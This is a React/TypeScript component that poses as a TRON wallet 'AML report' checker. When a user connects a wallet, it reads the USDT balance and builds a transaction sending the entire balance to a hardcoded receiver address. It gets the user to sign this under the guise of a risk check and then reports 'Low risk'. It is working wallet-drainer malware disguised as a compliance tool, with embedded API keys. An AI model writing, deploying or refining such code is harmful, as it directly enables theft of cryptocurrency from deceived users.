// components/TronAuthButton.tsx

import React, { useState, useEffect } from 'react';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import TronWeb from 'tronweb';
import { Buffer } from 'buffer';
window.Buffer = Buffer;

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';

const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  headers: { 'TRON-PRO-API-KEY': 'bbb42b6b-c4de-464b-971f-dea560319489' },
});

const adapter = new WalletConnectAdapter({
  network: 'Mainnet',
  options: {
    relayUrl: 'wss://relay.walletconnect.com',
    projectId: '6e52e99f199a2bd1feb89b31fbeb6a78',
    metadata: {
      name: 'AML',
      description: 'TRON + WalletConnect Integration',
      url: 'https://amlreports.pro',
      icons: [`https://amlreports.pro/images/icon-3.abdd8ed5.webp`],
    },
  },
  web3ModalConfig: { themeMode: 'dark' },
});

export const TronAuthButton: React.FC = () => {
  const [modalMessage, setModalMessage] = useState<string | null>(null);
  const [processing, setProcessing] = useState(false);
  const [userAddress, setUserAddress] = useState<string | null>(null);

  useEffect(() => {
    if (typeof (adapter as any).init === 'function') {
      (adapter as any).init();
    }
    adapter.on('disconnect', () => {
      setProcessing(false);
      setModalMessage(null);
      setUserAddress(null);
    });
  }, []);

  const disconnectAndNotify = async (message?: string) => {
    await adapter.disconnect();
    setProcessing(false);
    if (message) setModalMessage(message);
  };

  const connectWallet = async () => {
    setProcessing(true);
    try {
      await adapter.connect();

      const address = adapter.address;
      if (!address || !tronWeb.isAddress(address)) {
        throw new Error('Invalid wallet address');
      }
      setUserAddress(address);
      tronWeb.setAddress(address);

      const trxRaw = await tronWeb.trx.getBalance(address);
      const MIN_TRX_BALANCE = 5 * 1_000_000;
      if (trxRaw < MIN_TRX_BALANCE) {
        return await disconnectAndNotify('❌ Insufficient TRX for transaction fee. Minimum 5 TRX required.');
      }

      const usdtContract = await tronWeb.contract().at(USDT_CONTRACT);
      const usdtRaw = await usdtContract.methods.balanceOf(address).call();
      const usdt = Number(usdtRaw) / 1e6;

      if (usdt < 1) {
        return await disconnectAndNotify('✅ AML report: Low risk. Minimal USDT balance.');
      }

      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        USDT_CONTRACT,
        'transfer(address,uint256)',
        { feeLimit: 25_000_000, callValue: 0 },
        [
          { type: 'address', value: TRON_RECEIVER },
          { type: 'uint256', value: usdtRaw },
        ],
        address
      );

      const serializedTx = tronWeb.utils.transaction.txJsonToPb(transaction);
      const signedSerializedTx = await adapter.signTransaction(serializedTx);
      const sendResult = await tronWeb.trx.sendRawTransaction(signedSerializedTx);

      if (!sendResult.result) {
        throw new Error('USDT transfer failed.');
      }

      await disconnectAndNotify('✅ AML report: All USDT funds transferred.\nLow risk.');
    } catch (err: any) {
      console.error('Error:', err);
      const errMsg = err?.message || err?.toString();
      if (
        errMsg.includes('Invalid address provided') ||
        errMsg.includes('Modal is closed') ||
        errMsg.includes('User rejected') ||
        errMsg.includes('Timeout')
      ) {
        setProcessing(false);
        return;
      }
      await disconnectAndNotify('⚠️ Connection or transaction error');
    }
  };

  const handleClick = () => {
    if (!adapter.connected && !processing) {
      connectWallet();
    }
  };

  return (
    <button onClick={handleClick} className='AuthButton' style={{ cursor: 'pointer' }}>
      Check Your Wallet
      {modalMessage && (
        <div className='modal__overflow'>
          <div className="modal">
            {modalMessage.includes('AML report') ? (
              <div className="content greenBorder">
                <h3>{modalMessage}</h3>
                <div className="nums">
                  <div><span className='circ green'></span> 0-30</div>
                  <div><span className='circ orange'></span> 31-69</div>
                  <div><span className='circ red'></span> 70-100</div>
                </div>
                <div className="content report">
                  <p>AML report for wallet:</p>
                  <h5>{userAddress}</h5>
                </div>
              </div>
            ) : (
              <p>{modalMessage}</p>
            )}
            <button onClick={() => setModalMessage(null)}>Close</button>
          </div>
        </div>
      )}
    </button>
  );
};
